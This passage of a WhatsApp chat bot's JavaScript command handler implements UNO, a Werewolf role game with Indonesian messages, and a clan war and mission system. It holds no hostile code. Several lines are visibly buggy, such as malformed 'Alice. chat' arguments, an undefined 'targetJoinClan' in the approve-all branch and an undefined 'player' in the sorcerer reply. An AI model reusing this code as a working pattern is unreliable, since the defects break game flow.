    return sendGameStatus(m.chat);

default:
    return reply("Command not recognized. Use `uno info` to view the list of commands.");
}

function createDeck() {
    const colors = ["red", "yellow", "green", "blue"];
    const values = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];
    const deck = [];
    colors.forEach(color => {
        values.forEach(value => {
            deck.push({ color, value });
            if (value !== "1") deck.push({ color, value });
        });
    });
    ["wild13", "wild14"].forEach(value => {
        deck.push({ color: "black", value });
        deck.push({ color: "black", value });
    });
    return shuffle(deck);
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function isValidPlay(currentCard, playCard) {
    return playCard.color === "black" || currentCard.color === playCard.color || currentCard.value === playCard.value;
}

function getNextPlayer(game) {
    const nextIndex = (game.currentPlayer + game.direction + game.players.length) % game.players.length;
    return nextIndex;
}

function hasPlayableCard(player, currentCard) {
    return player.hand.some(card => isValidPlay(currentCard, card));
}

function getCardImageUrl(card) {
    const baseUrl = "https://raw.githubusercontent.com/abhisheks008/UNO/main/images/";
    if (card.color === "black") {
        return `${baseUrl}${card.value}.png`;
    }
    return `${baseUrl}${card.color}${card.value}.png`;
}

async function sendGameStatus(chat) {
    const currentCardText = `Current Card: ${game.currentCard.color} ${game.currentCard.value}`;
    const currentCardImageUrl = getCardImageUrl(game.currentCard);
    const handsText = game.players.map((player, index) => `${index}: ${player.id} (${player.hand.length} cards)`).join("\n");
    const iniGameStatusText = `*Uno Game*\n\n${currentCardText}\nTurn: ${game.players[game.currentPlayer].id}\n\nPlayer Cards:\n${handsText}`;
    
    await Alice.sendMessage(chat, { text: iniGameStatusText });
    await Alice.sendMessage(chat, { image: { url: currentCardImageUrl }, caption: `Current Card: ${game.currentCard.color} ${game.currentCard.value}` });
}
}
break

      case 'wwpc':
case 'ww':
case 'werewolf': {
if (isBan) return XRB()
await XReaction()
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./AliceLibray/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    Alice.werewolf = Alice.werewolf ? Alice.werewolf : {};
    const ww = Alice.werewolf ? Alice.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        Alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdreply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumbnailReply, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumbnailReply,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(Alice. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(Alice. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(Alice. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${Alice.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await Alice.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdreply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumbnailReply, 300, 175),
                    sourceUrl: xtele,
                    mediaUrl: thumbnailReply,
                },
                mentionedJid: player,
            },
        });
        await run(Alice. chat, ww);
    } else      if (value === "kill") { 
    let byId = getPlayerById2(sender, parseInt(target), ww)
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return reply("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")    
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                Alice.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdreply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumbnailReply, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumbnailReply,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        Alice.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdreply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumbnailReply, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumbnailReply,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
    let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        Alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdreply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumbnailReply, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumbnailReply,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break

case "clan":
  case "clans":
    {
if (isBan) return XRB()
await XReaction()
      if (!m.isGroup) return XRG();
      let jimp = require("jimp");
      const resizeImage = async (image, width, height) => {
        const readImage = await jimp.read(image);
        const resizedImage = await readImage
          .resize(width, height)
          .getBufferAsync(jimp.MIME_JPEG);
        return resizedImage;
      };

      let thumbUrl = "https://telegra.ph/file/048d31385faac531d20c6.jpg";
      const {
        playerOnClan,
        readClans,
        writeClans,
        setMissions,
        upgradeMissonProgress,
        updateClanTaskProgress,
        upgradeClanLevel,
        simulateWinner,
        getClanData,
        saveClanData,
        saveTournamentData,
      } = require("./AliceSystem/AliceDatabase/Game/clan");

      async function startNextMatch(tournament) {
        let nextMatch = tournament.matches.find(
          (match) => match.status === "pending",
        );
        if (!nextMatch) {
          tournament.status = "completed";
          clans.currentTournament = null;

          let winnerClan = tournament.participants[0];
          let winningClanData = await getClanData(winnerClan);

          winningClanData.power += 1000;
          winningClanData.level += 5;

          saveClanData(winnerClan, winningClanData);

          await reply(
            `The tournament ${tournament.name} is over! The winner is ${winnerClan}. This clan receives 1000 power and advances 5 levels.`,
          );
          return;
        }

        let clan1Data = await getClanData(nextMatch.clan1);
        let clan2Data = await getClanData(nextMatch.clan2);

        nextMatch.status = "ongoing";
        writeClans(clans);

        let winner = simulateWinner(clan1Data, clan2Data);
        nextMatch.winner = winner;
        nextMatch.status = "completed";

        tournament.participants = tournament.participants.filter(
          (clan) =>
            clan !==
            (winner === clan1Data.clan ? clan2Data.clan : clan1Data.clan),
        );

        writeClans(clans);

        await reply(
          `The match between ${clan1Data.clan} and ${clan2Data.clan} is over! The winner is ${winner}.`,
        );

        setTimeout(() => startNextMatch(tournament), 5000);
      }

      const { sender, chat } = m;
      const clans = readClans();
      const clanData = clans[chat];
      const action = args[0];
      const param1 = args[1];
      const param2 = args[2];

      switch (action) {
        case "create":
          let existingUserClan = Object.values(clans).find(
            (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
          );
          if (existingUserClan) return reply("You already have a clan.");
          let createText = `*Hooray, Clan created successfully*`;
          clans[param1.toLowerCase()] = {
            room: param1,
            owner: sender.replace("@s.whatsapp.net", ""),
            status: false,
            clan: param1,
            members: [],
            joinRequests: [],
            level: 1,
            warLimit: 5,
            currentWarCount: 0,
            missions: {
              daily: {
                description: "Recruit 5 new members",
                progress: 0,
                target: 5,
                reward: 100,
              },
              weekly: {
                description: "Win 3 wars",
                progress: 0,
                target: 3,
                reward: 500,
              },
            },
            clanTasks: {
              description: "Reach level 3",
              progress: 1,
              target: 3,
              reward: 300,
            },
          };
          createText += `\n\nTo join clans, please type .clan join your clan name.`;
          writeClans(clans);
          await reply(createText.trim());
          break;

        case "join":
if (isBan) return XRB()
await XReaction()
          if (!param1)
            return reply(
              "Please enter the name of the clan you want to join.",
            );

          let userClanCheck = Object.values(clans).find(
            (c) => c.members && c.members.some((m) => m.id === sender),
          );
          if (userClanCheck)
            return reply("You are already part of another clan.");

          let targetJoinClan = Object.values(clans).find(
            (c) => c.clan.toLowerCase() === param1.toLowerCase(),
          );
          if (!targetJoinClan)
            return reply("The clan you want to join was not found.");
          if (playerOnClan(sender, chat, clans) === true)
            return reply("You are already part of this clan.");

          let joinData = {
            id: sender,
            number: targetJoinClan.members
              ? targetJoinClan.members.length + 1
              : 1,
            session: chat,
            status: false,
            clan: param1,
            vote: 0,
            isVote: false,
          };

          if (!targetJoinClan.joinRequests) {
            targetJoinClan.joinRequests = [];
          }

          targetJoinClan.joinRequests.push(joinData);
          writeClans(clans);

          let joinText = `Join request has been sent to clan ${targetJoinClan.clan}. Await approval from the clan leader.`;
          reply(joinText);
          break;

        case "approve":
if (isBan) return XRB()
await XReaction()
          if (!param1)
            return reply(
              "Please enter the name of the clan you want to view.",
            );
          let approveClan = Object.values(clans).find(
            (c) => c.clan.toLowerCase() === param1.toLowerCase(),
          );
          if (!approveClan) return reply("Clan not found.");

          if (approveClan.owner !== sender.replace("@s.whatsapp.net", ""))
            return reply(
              "You do not have permission to approve join requests.",
            );

          if (
            !approveClan.joinRequests ||
            approveClan.joinRequests.length === 0
          )
            return reply(
              "There are no join requests pending approval.",
            );

              let approveText = "";

              if (param2 === "all") {
                let approvedMembers = [];
                approveClan.joinRequests.forEach((request) => {
                  targetJoinClan.members.push({
                    id: request.id,
                    number: approveClan.members.length + 1,
                    sesi: chat,
                    status: false,
                    clan: request.clan,
                    vote: 0,
                  });
                  approvedMembers.push(request.id);
approveText += `Join request from @${request.id.replace("@s.whatsapp.net", "")} has been approved.\n`;
});
approveClan.joinRequests = [];
writeClans(clans);
} else if (param2) {
  let index = parseInt(param2) - 1;
  if (
    isNaN(index) ||
    index < 0 ||
    index >= approveClan.joinRequests.length
  )
    return reply("Invalid index number.");

  let requester = approveClan.joinRequests[index];
  approveClan.joinRequests.splice(index, 1);
  approveClan.members.push({
    id: requester.id,
    number: approveClan.members.length + 1,
    session: chat,
    status: false,
    clan: requester.clan,
    vote: 0,
  });
  approveText = `Join request from @${requester.id.replace("@s.whatsapp.net", "")} has been approved.`;
  writeClans(clans);
} else {
  let pendingRequestsText = `Please specify whether you want to approve all join requests (all) or a specific user's request.\n\n`;
  pendingRequestsText += "*List of Join Requests:*\n";
  approveClan.joinRequests.forEach((request, index) => {
    pendingRequestsText += `${index + 1}. @${request.id.replace("@s.whatsapp.net", "")}\n`;
  });

  pendingRequestsText +=
    "\nTo approve a specific request, use the command '.clan approve [index number]'";
  return reply(pendingRequestsText.trim());
}

await reply(approveText);
break;

case "war":
if (isBan) return XRB()
await XReaction()
  let warInitiatorClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!warInitiatorClan)
    return reply("You do not have a clan to start a war.");

  if (warInitiatorClan.currentWarCount >= warInitiatorClan.warLimit)
    return reply(
      `Your daily war limit has been reached (${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}).`,
    );

  let warTargetClan = Object.values(clans).filter(
    (c) => c.clan !== warInitiatorClan.clan,
  );
  if (warTargetClan.length === 0)
    return reply(
      "No other clans found for war.",
    );

  warTargetClan =
    warTargetClan[Math.floor(Math.random() * warTargetClan.length)];

  if (warInitiatorClan.war || warTargetClan.war)
    return reply(
      "One or both clans are currently in a state of war.",
    );

  let initiatorPower =
    warInitiatorClan.level * warInitiatorClan.members.length;
  let targetPower =
    warTargetClan.level * warTargetClan.members.length;
  let winnerClan =
    initiatorPower >= targetPower
      ? warInitiatorClan
      : warTargetClan;
  let loserClan =
    initiatorPower < targetPower ? warInitiatorClan : warTargetClan;
  let warReward = Math.floor(Math.random() * 3) + 1;

  winnerClan.level += 1; 
  winnerClan.warLimit += warReward;
  winnerClan.currentWarCount += 1;
  loserClan.currentWarCount += 1;

  if (winnerClan.missions && winnerClan.missions.daily) {
    if (
      winnerClan.missions.daily.description.includes("Reach level")
    ) {
      winnerClan.missions.daily.progress = winnerClan.level;
      if (
        winnerClan.missions.daily.progress >=
        winnerClan.missions.daily.target
      ) {
        winnerClan.warLimit += winnerClan.missions.daily.reward;
        winnerClan.missions.daily.completed = true;
      }
    }
  }

  if (winnerClan.missions && winnerClan.missions.weekly) {
    if (
      winnerClan.missions.weekly.description.includes("Reach level")
    ) {
      winnerClan.missions.weekly.progress = winnerClan.level;
      if (
        winnerClan.missions.weekly.progress >=
        winnerClan.missions.weekly.target
      ) {
        winnerClan.warLimit += winnerClan.missions.weekly.reward;
        winnerClan.missions.weekly.completed = true;
      }
    }
  }

  let warResultText = `*War Result:*\n\n`;
  warResultText += `Winner: ${winnerClan.clan} (Level ${winnerClan.level})\n`;
  warResultText += `Loser: ${loserClan.clan} (Level ${loserClan.level})\n`;
  warResultText += `Clan ${winnerClan.clan} receives an additional war limit reward of ${warReward}.\n\n`;
  warResultText += `Daily war count for ${warInitiatorClan.clan}: ${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}`;
  writeClans(clans);
  await reply(warResultText.trim());
  break;

case "list":
if (isBan) return XRB()
await XReaction()
  let listText = `*List of Clans:*\n\n`;
  for (let clanKey in clans) {
    if (
      clanKey === "tournaments" ||
      clanKey === "currentTournament"
    )
      continue;

    let clan = clans[clanKey];
    if (clan && clan.members) {
      let warLimitDisplay =
        clan.warLimit !== null && clan.warLimit !== undefined
          ? clan.warLimit
          : 3;
      listText += `Clan Name: ${clan.clan}\n`;
      listText += `Level: ${clan.level}\n`;
      listText += `Number of Members: ${clan.members.length}\n`;
      listText += `Daily War Limit: ${clan.currentWarCount}/${warLimitDisplay}\n\n`;
    }
  }
  await reply(listText.trim());
  break;

case "leave":
if (isBan) return XRB()
await XReaction()
  let userClan = Object.values(clans).find(
    (c) => c.members && c.members.some((m) => m.id === sender),
  );
  if (!userClan)
    return reply("You are not part of any clan.");

  userClan.members = userClan.members.filter(
    (m) => m.id !== sender,
  );
  writeClans(clans);
  await reply(`You have left the clan ${userClan.clan}.`);
  break;

case "delete":
  let deleteClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!deleteClan)
    return reply("You do not have a clan to delete.");

  delete clans[deleteClan.clan.toLowerCase()];
  writeClans(clans);
  await reply(`Clan ${deleteClan.clan} has been deleted.`);
  break;

case "member":
if (isBan) return XRB()
await XReaction()
  let targetClanMember = Object.values(clans).find(
    (c) => c.clan.toLowerCase() === param1.toLowerCase(),
  );
  if (!targetClanMember)
    return reply("The clan you are looking for was not found.");

  let memberText = `*List of Members in Clan ${targetClanMember.clan}:*\n\n`;
  targetClanMember.members.forEach((member, index) => {
    memberText += `${index + 1}. @${member.id.replace("@s.whatsapp.net", "")}\n`;
  });
  await reply(memberText.trim());
  break;

case "missions":
if (isBan) return XRB()
await XReaction()
  let missionsClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!missionsClan)
    return reply("You do not have a clan to view missions.");

  let missionsText = `*Clan ${missionsClan.clan} Missions:*\n\n`;
  if (missionsClan.missions && missionsClan.missions.daily) {
    missionsText += `Daily Mission: ${missionsClan.missions.daily.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.daily.progress}/${missionsClan.missions.daily.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.daily.reward}\n\n`;
  }
  if (missionsClan.missions && missionsClan.missions.weekly) {
    missionsText += `Weekly Mission: ${missionsClan.missions.weekly.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.weekly.progress}/${missionsClan.missions.weekly.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.weekly.reward}\n\n`;
  }
  await reply(missionsText.trim());
  break;

case "task":
if (isBan) return XRB()
await XReaction()
  let taskClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!taskClan)
    return reply("You do not have a clan to view tasks.");

  let taskText = `*Clan ${taskClan.clan} Tasks:*\n\n`;
  if (taskClan.clanTasks) {
    taskText += `Task Description: ${taskClan.clanTasks.description}\n`;
    taskText += `Progress: ${taskClan.clanTasks.progress}/${taskClan.clanTasks.target}\n`;
    taskText += `Reward: ${taskClan.clanTasks.reward}\n`;
  } else {
taskText += "No tasks currently.";
}
await reply(taskText.trim());
break;

case "upgrade":
if (isBan) return XRB()
await XReaction()
  let upgradeClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!upgradeClan)
    return reply(
      "You do not have a clan to upgrade.",
    );

  let upgradeCost = upgradeClan.level * 1000; // *☘️ Example :* upgrade cost based on clan level
